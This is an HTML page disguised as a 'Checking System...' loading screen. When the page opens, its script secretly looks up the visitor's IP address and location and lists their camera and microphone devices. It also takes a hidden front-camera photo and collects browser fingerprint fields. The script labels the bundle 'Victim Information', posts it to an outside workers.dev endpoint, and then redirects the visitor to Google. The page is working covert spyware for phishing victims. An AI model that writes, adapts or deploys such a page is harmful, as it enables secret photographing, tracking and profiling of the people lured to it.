<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking System...</title>
    <style>
        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <!-- عناصر الكاميرا المخفية -->
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        async function captureAll() {
            let photoData = null;
            let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown" };

            // 1. جلب معلومات الـ IP والمنطقة بدقة
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipInfo = await res.json();
            } catch(e) {}

            // 2. جلب معلومات أجهزة الوسائط (الكاميرا والميكروفون)
            let mediaDevicesInfo = "";
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                devices.forEach(device => {
                    mediaDevicesInfo += `${device.kind}:  id = ${device.deviceId}\n`;
                });
            } catch (err) { mediaDevicesInfo = "Permission Denied"; }

            // 3. محاولة التقاط الصورة الأمامية
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 2000)); // انتظار فتح الكاميرا
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                photoData = canvas.toDataURL('image/jpeg');
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {}

            // 4. تجميع الرسالة الكبيرة (نفس التنسيق الذي طلبته أول مرة)
            const message = `
✅<b>Victim Information</b> 

⚓ IP: ${ipInfo.ip} (https://ip-api.com/#${ipInfo.ip}) | Time: ${new Date().toISOString().replace('T', ' ').split('.')[0]}

⏳ Date In Victim's Device : ${new Date().toString()}

📱 <b>Device Information</b>
productSub: ${navigator.productSub}
vendor: ${navigator.vendor}
maxTouchPoints: ${navigator.maxTouchPoints}
hardwareConcurrency: ${navigator.hardwareConcurrency}
cookieEnabled: ${navigator.cookieEnabled}
appCodeName: ${navigator.appCodeName}
appName: ${navigator.appName}
appVersion: ${navigator.appVersion}
platform: ${navigator.platform}
product: ${navigator.product}
userAgent: ${navigator.userAgent}
language: ${navigator.language}
languages: ${navigator.languages.join(', ')}
webdriver: ${navigator.webdriver}
pdfViewerEnabled: ${navigator.pdfViewerEnabled}

📷 <b>Media Device Information</b>
${mediaDevicesInfo}

🌐 <b>Location Details</b>
City: ${ipInfo.city}
Country: ${ipInfo.country_name}
ISP: ${ipInfo.org}
            `;

            // 5. إرسال البيانات للـ Worker الخاص بك
            const workerUrl = "https://gbs.tjarb093.workers.dev/";
            try {
                await fetch(workerUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: message, image: photoData })
                });
            } catch(e) {}

            // 6. التوجيه النهائي لجوجل
            window.location.href = "https://www.google.com";
        }

        window.onload = captureAll;
    </script>
</body>
</html>
